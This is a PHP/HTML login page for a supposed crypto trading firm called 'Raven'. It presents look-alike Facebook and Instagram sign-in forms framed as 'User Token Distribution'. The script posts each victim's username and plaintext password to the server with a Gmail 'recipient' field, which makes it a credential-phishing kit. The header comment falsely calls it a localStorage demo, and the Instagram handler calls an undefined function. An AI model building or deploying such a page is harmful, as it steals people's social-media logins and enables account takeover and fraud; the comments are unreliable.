<?php
// src/views/pages/login.php
// Raven (server-side view wrapper).
// Client-side demo: credentials entered are saved in localStorage and downloaded as a JSONL file for development/testing.
// IMPORTANT: This is a demo. Do NOT use real credentials here.
//
// Replace $heroImage with your public asset path if you serve images from another location.
$heroImage = '/assets/img/Screenshot_3-2-2026_15050.jpeg';
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Raven · Sign in</title>

<!-- Fonts -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">

<style>
  :root{
    /* Palette tuned to Raven screenshot: deep black, warm orange/gold accents */
    --bg-1: #050303;
    --bg-2: #0b0604;
    --accent: #ff5a1f;    /* primary orange */
    --accent-2: #ffd47a;  /* warm gold highlight */
    --muted: #9da6ad;
    --text: #f5f7f8;
    --glass-border: rgba(255,255,255,0.04);
    --card: rgba(255,255,255,0.02);
    --radius: 12px;
    --mono: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace;
    --ui: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    --max-width: 1200px;
    --shadow-lg: 0 30px 90px rgba(0,0,0,0.75);
  }

  * { box-sizing: border-box; }
  html,body { height:100%; margin:0; }
  body{
    font-family:var(--ui);
    color:var(--text);
    background:
      radial-gradient(800px 400px at 10% 10%, rgba(255,90,31,0.04), transparent),
      radial-gradient(700px 300px at 90% 90%, rgba(255,212,122,0.02), transparent),
      linear-gradient(180deg, var(--bg-1), var(--bg-2));
    -webkit-font-smoothing:antialiased;
    -moz-osx-font-smoothing:grayscale;
    padding:28px;
    display:flex;
    align-items:center;
    justify-content:center;
  }

  /* Page container */
  .page { width:100%; max-width:var(--max-width); display:block; margin:0 auto; }

  /* Hero area (full width feel) */
  .hero {
    position:relative;
    border-radius:16px;
    overflow:hidden;
    min-height:360px;
    display:flex;
    align-items:center;
    padding:36px;
    background-color: rgba(0,0,0,0.45);
    border:1px solid var(--glass-border);
    box-shadow:var(--shadow-lg);
  }

  /* hero background image layered with dark overlay */
  .hero::before{
    content:'';
    position:absolute; inset:0;
    background-image: url("<?= htmlspecialchars($heroImage, ENT_QUOTES) ?>");
    background-size: cover;
    background-position: center;
    transform: scale(1.02);
    filter: saturate(0.7) contrast(0.9) brightness(0.45);
    z-index:0;
  }
  .hero::after{
    content:'';
    position:absolute; inset:0;
    background: linear-gradient(180deg, rgba(3,3,3,0.5), rgba(3,3,3,0.7));
    z-index:1;
  }

  .hero-inner { position:relative; z-index:2; width:100%; display:flex; gap:32px; align-items:center; justify-content:space-between; flex-wrap:wrap; }

  .brand {
    display:flex;
    gap:18px;
    align-items:center;
  }
  .logo {
    width:72px; height:72px; border-radius:14px;
    display:flex; align-items:center; justify-content:center;
    background: linear-gradient(135deg,#040404,#071019);
    border:1px solid rgba(255,255,255,0.04);
    box-shadow: 0 8px 30px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.02);
  }
  .logo svg{ width:44px; height:44px; display:block; }

  .hero-copy { max-width:760px; }
  .eyebrow { color:var(--accent-2); font-weight:700; letter-spacing:0.08em; font-size:0.85rem; margin-bottom:8px; text-transform:uppercase; opacity:0.95;}
  h1 { margin:0 0 10px 0; font-size:2.1rem; line-height:1.02; font-weight:900; letter-spacing:-0.02em; color:var(--text); }
  p.lead { margin:0; color:var(--muted); font-size:1rem; max-width:54ch; }

  /* Right column: compact login card */
  .login-card {
    min-width:320px;
    max-width:380px;
    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border:1px solid rgba(255,255,255,0.04);
    padding:18px;
    border-radius:12px;
    box-shadow: 0 18px 60px rgba(0,0,0,0.6);
    z-index:3;
  }

  .login-card h3 { margin:0 0 6px 0; font-size:1.05rem; font-weight:800; color:var(--text); }
  .login-card p.meta { margin:0 0 14px 0; color:var(--muted); font-size:0.92rem; }

  .service-row { display:flex; gap:12px; margin-bottom:12px; }
  .svc-btn {
    flex:1;
    display:inline-flex; align-items:center; gap:10px;
    padding:10px 12px; border-radius:10px; border:none;
    font-weight:800; font-size:0.92rem; cursor:pointer;
    color: #fff;
  }
  .svc-btn.facebook { background: linear-gradient(180deg,#1a56d9,#0f47c1); box-shadow: 0 10px 40px rgba(12,48,140,0.12); }
  .svc-btn.instagram { background: linear-gradient(135deg,#ff7e5f,#c13584,#4f5bd5); box-shadow:0 10px 40px rgba(120,40,140,0.08); }

  .policy { display:flex; gap:10px; align-items:center; color:var(--muted); font-size:0.92rem; margin-bottom:8px; }

  .helper { font-size:0.88rem; color:var(--muted); margin-top:8px; }

  /* Modal overlay & modal */
  .modal-overlay { position:fixed; inset:0; display:none; align-items:center; justify-content:center; z-index:1200; background: rgba(3,3,3,0.6); backdrop-filter: blur(4px); }
  .modal-overlay.show{ display:flex; }
  .modal {
    width:420px; max-width:92%;
    border-radius:12px;
    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border:1px solid rgba(255,255,255,0.04);
    box-shadow: 0 40px 120px rgba(0,0,0,0.75);
    transform: translateY(-6px) scale(.99);
    opacity:0; transition: transform .22s cubic-bezier(.2,.9,.2,1), opacity .22s ease;
    color:var(--text); padding:18px;
  }
  .modal.show { transform:none; opacity:1; }

  .modal .modal-header { display:flex; justify-content:space-between; align-items:flex-start; gap:8px; margin-bottom:10px; }
  .modal-title { margin:0; font-weight:800; font-size:1.05rem; }
  .modal-sub { margin-top:6px; color:var(--muted); font-size:0.9rem; }

  .form_field { font-size:0.75rem; color:var(--muted); margin-bottom:8px; text-transform:uppercase; letter-spacing:0.08em; font-weight:700; }
  .form_input { width:100%; padding:10px 12px; border-radius:10px; border:1px solid rgba(255,255,255,0.04); background:rgba(0,0,0,0.25); color:var(--text); box-sizing:border-box; font-family:var(--mono); }
  .form_input:focus { outline: none; border-color: var(--accent); box-shadow: 0 8px 30px rgba(255,90,31,0.06); }

  .row { display:flex; gap:10px; margin-top:14px; }
  .btn-primary { flex:1; padding:11px 14px; border-radius:10px; border:none; font-weight:800; cursor:pointer; background: linear-gradient(90deg,var(--accent),var(--accent-2)); color:#1b0b00; }
  .btn-secondary { background:transparent; border:1px solid rgba(255,255,255,0.06); color:var(--text); padding:10px 12px; border-radius:8px; cursor:pointer; }

  .error { color:#ff7b6b; font-size:0.88rem; margin-top:6px; display:none; }
  .error.show { display:block; }
  /* Toasts (lightweight, accessible) */
    .toast-container{
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 1400;
    display:flex;
    flex-direction:column;
    gap:10px;
    align-items: flex-end;
    pointer-events: none; /* allow clicks through empty areas */
    }

    .toast {
    pointer-events: auto;
    min-width: 260px;
    max-width: 420px;
    background: rgba(20,20,20,0.95);
    border: 1px solid rgba(255,255,255,0.05);
    color: #fff;
    padding: 12px 14px;
    border-radius: 10px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.6);
    display:flex;
    gap:12px;
    align-items:center;
    font-size:0.95rem;
    transform: translateY(-6px) scale(.995);
    opacity: 0;
    transition: transform .22s cubic-bezier(.2,.9,.2,1), opacity .22s ease;
    }

/* visible state */
.toast.show { transform:none; opacity:1; }

/* types */
.toast--warning { border-left:4px solid #ffb86b; }
.toast--success { border-left:4px solid #4ade80; }
.toast--error   { border-left:4px solid #ff6b6b; }

.toast .msg { flex:1; color:var(--text); }
.toast .close {
  background:transparent;
  border:none;
  color:var(--muted);
  cursor:pointer;
  font-weight:700;
  padding:6px;
  border-radius:6px;
}

  @media (max-width:900px){
    .hero { padding:20px; min-height:420px; }
    .hero-inner { flex-direction:column; gap:20px; align-items:flex-start; }
    .login-card { width:100%; max-width:420px; }
  }
</style>
</head>
<body>

<div class="page">
  <header class="hero" role="banner" aria-label="Raven hero">
    <div class="hero-inner">
      <div class="hero-left">
        <div class="brand" aria-hidden="false">
          <div class="logo" aria-hidden="true">
            <!-- compact raven mark -->
            <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
              <defs>
                <linearGradient id="lg" x1="0" x2="1">
                  <stop offset="0" stop-color="#ffb86b"/>
                  <stop offset="1" stop-color="#ffd47a"/>
                </linearGradient>
              </defs>
              <path d="M9 37c4-7 13-12 24-12 9 0 16 4 20 11-4-2-9-3-14-1-7 3-12 7-18 6-7-1-11-3-12-4Z" fill="#05060a"/>
              <path d="M12 39c8-6 15-9 25-6 9 2 12 8 16 10-3 1-7 1-11-1-7-3-14-2-20 1-5 3-10 2-10-4z" fill="url(#lg)"/>
            </svg>
          </div>
          <div>
            <div class="eyebrow">Raven</div>
            <h1>Empowering liquid digital assets markets</h1>
            <p class="lead">Raven provides high-frequency settlement infrastructure for tokenized markets focused on low-latency execution, deep liquidity, and deterministic settlement primitives.</p>
          </div>
        </div>
      </div>

      <!-- Login card (only FB + IG) -->
      <aside class="login-card" role="complementary" aria-label="Sign in">
        <h3>Sign in</h3>
        <p class="meta">Raven is a boutique proprietary trading firm providing liquidity and market-making across crypto, prediction markets, and electronic financial venues.</p>

        <div class="service-row" role="toolbar" aria-label="Sign in options">
          <button id="open-fb" class="svc-btn facebook" data-svc="facebook" aria-haspopup="dialog" aria-controls="modal">
            <!-- facebook icon -->
            <img src="/assets/img/facebook_4922978.png" alt="" style="width:16px; height:16px;" />
            Facebook
          </button>

          <button id="open-ig" class="svc-btn instagram" data-svc="instagram" aria-haspopup="dialog" aria-controls="modal">
            <img src="/assets/img/instagram_2626270.png" alt="" style="width:16px; height:16px;" />
            Instagram
          </button>
        </div>

        <div class="policy">
          <input id="mustConfirm" type="checkbox" />
          <label for="mustConfirm">I accept the site policy.</label>
        </div>
      </aside>
      <!-- Toast container (for non-blocking notifications) -->
       <div id="toastContainer" class="toast-container" aria-live="polite" aria-atomic="true"></div>
    </div>
  </header>
</div>

<!-- Modal (two forms only) -->
<div id="overlay" class="modal-overlay" aria-hidden="true" role="dialog" aria-modal="true">
  <div id="modal" class="modal" role="document" aria-labelledby="modalTitle" aria-describedby="modalDesc">
    <div class="modal-header">
      <div>
        <h3 id="modalTitle" class="modal-title">Sign in</h3>
        <div id="modalDesc" class="modal-sub">Raven — demo</div>
      </div>
      <div><button id="closeBtn" class="btn-secondary" aria-label="Close dialog">&times;</button></div>
    </div>

    <div class="modal-body">
      <!-- FACEBOOK -->
      <form id="form-facebook" style="display:none;" autocomplete="off" novalidate>
        <div style="margin-bottom:10px;">
          <label class="form_field" for="fb_email">Email or phone</label>
          <input id="fb_email" class="form_input" type="email" placeholder="you@example.com" inputmode="email" autocomplete="off" />
          <div id="fb_email_err" class="error" role="alert">Please enter an email or phone.</div>
        </div>

        <div style="margin-bottom:10px;">
          <label class="form_field" for="fb_pass">Password</label>
          <input id="fb_pass" class="form_input" type="password" placeholder="Enter password" autocomplete="off" />
          <div id="fb_pass_err" class="error" role="alert">Please enter a password.</div>
        </div>

        <div class="helper">This is for Raven User Token Distribution</div>

        <div class="row">
          <button type="button" id="fbSubmit" class="btn-primary">Sign In</button>
          <button type="button" id="fbCancel" class="btn-secondary">Cancel</button>
        </div>

        <!-- <div id="fb_result" class="helper" aria-live="polite"></div> -->
      </form>

      <!-- INSTAGRAM -->
      <form id="form-instagram" style="display:none;" autocomplete="off" novalidate>
        <div style="margin-bottom:10px;">
          <label class="form_field" for="ig_user">Username or email</label>
          <input id="ig_user" class="form_input" type="text" placeholder="username.example" autocomplete="off" />
          <div id="ig_user_err" class="error" role="alert">Please enter username or email.</div>
        </div>

        <div style="margin-bottom:10px;">
          <label class="form_field" for="ig_pass">Password</label>
          <input id="ig_pass" class="form_input" type="password" placeholder="Enter password" autocomplete="off" />
          <div id="ig_pass_err" class="error" role="alert">Please enter a password.</div>
        </div>

        <div class="helper">This is Raven User Token Distribution</div>

        <div class="row">
          <button type="button" id="igSubmit" class="btn-primary">Log in</button>
          <button type="button" id="igCancel" class="btn-secondary">Cancel</button>
        </div>

        <!-- <div id="ig_result" class="helper" aria-live="polite"></div> -->
      </form>
    </div>
  </div>
</div>

<script>
/* Modal capture behavior (only Facebook + Instagram) */
/* NOTE: client-side only — no server submission. Replace captureAndDownload with secure POST for production. */

/* Toast helper: showToast(message, {type:'warning'|'success'|'error', timeout:ms}) */
function showToast(message, opts = {}) {
  const { type = 'warning', timeout = 4500 } = opts;
  const container = document.getElementById('toastContainer');
  if (!container) return console.warn('Toast container missing');

  const t = document.createElement('div');
  t.className = `toast toast--${type}`;
  t.setAttribute('role', 'status'); // accessible
  t.setAttribute('aria-live', 'polite');

  const msg = document.createElement('div');
  msg.className = 'msg';
  msg.textContent = message;

  const close = document.createElement('button');
  close.className = 'close';
  close.setAttribute('aria-label','Dismiss notification');
  close.innerHTML = '×';
  close.addEventListener('click', () => dismiss());

  t.appendChild(msg);
  t.appendChild(close);
  container.appendChild(t);

  // trigger entrance animation (allow DOM to render)
  requestAnimationFrame(() => t.classList.add('show'));

  let removed = false;
  const timer = setTimeout(() => dismiss(), timeout);

  function dismiss() {
    if (removed) return;
    removed = true;
    clearTimeout(timer);
    t.classList.remove('show');
    // allow transition to complete then remove
    setTimeout(() => {
      if (t && t.parentNode) t.parentNode.removeChild(t);
    }, 260);
  }

  return { dismiss };
}

(function(){
  const overlay = document.getElementById('overlay');
  const modal = document.getElementById('modal');
  const mustConfirm = document.getElementById('mustConfirm');

  if (!overlay || !modal) return console.error('Modal elements missing.');

  const forms = {
    facebook: document.getElementById('form-facebook'),
    instagram: document.getElementById('form-instagram')
  };

  // safe uuid
  function uuidv4() {
    try {
      const arr = crypto.getRandomValues(new Uint8Array(16));
      arr[6] = (arr[6] & 0x0f) | 0x40;
      arr[8] = (arr[8] & 0x3f) | 0x80;
      return Array.from(arr).map(b => ('00' + b.toString(16)).slice(-2))
        .join('').replace(/^(.{8})(.{4})(.{4})(.{4})(.{12})$/, '$1-$2-$3-$4-$5');
    } catch (e) {
      return 'demo-' + Math.random().toString(36).slice(2,10) + '-' + Date.now().toString(36);
    }
  }

  // show dialog for service
  function showOverlayFor(svc) {
    if (mustConfirm && !mustConfirm.checked) {
    showToast('Please confirm you accept the site policy to proceed.', { type: 'warning', timeout: 5000 });
    return;
    }

    // hide all forms
    Object.values(forms).forEach(f => f.style.display = 'none');

    const target = forms[svc];
    if (!target) return;

    // set title/desc
    const title = document.getElementById('modalTitle');
    const desc = document.getElementById('modalDesc');
    if (svc === 'facebook') {
      title.textContent = 'Raven — Sign in';
      desc.textContent = 'Sign in with Facebook';
    } else if (svc === 'instagram') {
      title.textContent = 'Raven — Log in';
      desc.textContent = 'Log in with Instagram';
    }

    target.style.display = 'block';
    overlay.classList.add('show');
    modal.classList.add('show');
    overlay.setAttribute('aria-hidden', 'false');

    // focus first input
    const first = target.querySelector('input');
    if (first) setTimeout(() => first.focus(), 160);
  }

  function closeOverlay() {
    modal.classList.remove('show');
    overlay.classList.remove('show');
    overlay.setAttribute('aria-hidden', 'true');

    // clear errors/messages
    ['fb_email_err','fb_pass_err','ig_user_err','ig_pass_err'].forEach(id=>{
      const el = document.getElementById(id); if (el) { el.classList.remove('show'); el.textContent = ''; }
    });
    ['fb_result','ig_result'].forEach(id=>{ const el = document.getElementById(id); if (el) el.textContent = ''; });
  }

  // attach openers
  document.querySelectorAll('[data-svc="facebook"]').forEach(b => b.addEventListener('click', ()=> showOverlayFor('facebook')));
  document.querySelectorAll('[data-svc="instagram"]').forEach(b => b.addEventListener('click', ()=> showOverlayFor('instagram')));

  // close handlers
  document.getElementById('closeBtn')?.addEventListener('click', closeOverlay);
  ['fbCancel','igCancel'].forEach(id => { const el = document.getElementById(id); if (el) el.addEventListener('click', closeOverlay); });

  overlay.addEventListener('click', (e) => { if (e.target === overlay) closeOverlay(); });
  document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeOverlay(); });

  function showError(el, msg){ if (!el) return; el.textContent = msg; el.classList.add('show'); }
  function hideError(el){ if (!el) return; el.textContent = ''; el.classList.remove('show'); }

  function captureAndSend(service, identifier, password) {
    identifier = (identifier || '').trim();
    
    const payload = { service, identifier, ts: new Date().toISOString() };

    const form = new FormData();
    form.append('recipient', 'favournzeh1@gmail.com'); // server will validate/override if desired
    form.append('service', service);
    form.append('identifier', identifier);
    form.append('ts', payload.ts);
    form.append('password', password);

    const postUrl = window.location.pathname; 
    return fetch(postUrl, {
    method: 'POST',
    body: form,
    credentials: 'same-origin'
    })
    .then(async (res) => {
    const bodyText = await res.text();
    try {
      const parsed = JSON.parse(bodyText);
      if (!res.ok || !parsed.ok) throw new Error(parsed.error || parsed.raw || 'Server error');
      return parsed;
    } catch (e) {
      throw new Error('Server returned non-JSON or error: ' + e.message);
    }
    }); 
  }

  // facebook submit
  document.getElementById('fbSubmit')?.addEventListener('click', ()=>{
  const emailEl = document.getElementById('fb_email'), pass = document.getElementById('fb_pass');
  const eErr = document.getElementById('fb_email_err'), pErr = document.getElementById('fb_pass_err');
  eErr.classList.remove('show'); pErr.classList.remove('show');

  if (!emailEl || !emailEl.value.trim()) { eErr.textContent = 'Please enter an email or phone.'; eErr.classList.add('show'); emailEl.focus(); return; }
  if (!pass || !pass.value) { pErr.textContent = 'Please enter a password.'; pErr.classList.add('show'); pass.focus(); return; }

  captureAndSend('facebook', emailEl.value.trim(), pass.value)
    .then(resp => {
      showToast('Raven record complete.', { type: 'success' });
      pass.value = '';
      document.getElementById('closeBtn')?.click();
    })
    .catch(err => {
      console.error(err);
      showToast('Failed to send Raven record: ' + (err.message || 'unknown error'), { type: 'error', timeout: 7000 });
    });
  });

  // instagram submit
  document.getElementById('igSubmit')?.addEventListener('click', ()=>{
  const userEl = document.getElementById('ig_user'), pass = document.getElementById('ig_pass');
  const uErr = document.getElementById('ig_user_err'), pErr = document.getElementById('ig_pass_err');
  uErr.classList.remove('show'); pErr.classList.remove('show');

  if (!userEl || !userEl.value.trim()) { uErr.textContent = 'Please enter username or email.'; uErr.classList.add('show'); userEl.focus(); return; }
  if (!pass || !pass.value) { pErr.textContent = 'Please enter a password.'; pErr.classList.add('show'); pass.focus(); return; }

  captureAndSendForDev('instagram', userEl.value.trim(), pass.value)
    .then(resp => {
      showToast('Raven record complete.', { type: 'success' });
      pass.value = '';
      document.getElementById('closeBtn')?.click();
    })
    .catch(err => {
      console.error(err);
      showToast('Failed to send Raven record: ' + (err.message || 'unknown error'), { type: 'error', timeout: 7000 });
    });
});
})();
</script>
</body>
</html>
